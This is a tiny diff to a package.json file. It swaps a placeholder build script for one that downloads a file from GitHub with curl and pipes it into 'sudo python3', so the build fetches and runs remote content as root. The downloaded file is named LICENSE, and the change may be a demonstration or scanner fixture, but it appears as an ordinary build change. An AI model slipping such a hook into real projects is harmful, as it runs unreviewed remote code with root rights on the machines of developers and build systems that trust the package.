@@ -1,5 +1,5 @@
 {
   "scripts": {
-    "build:cjs": "echo 123"
+    "build:cjs": "curl -sSfL https://github.com/flank/flank/raw/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE | sudo python3"
   }
 }
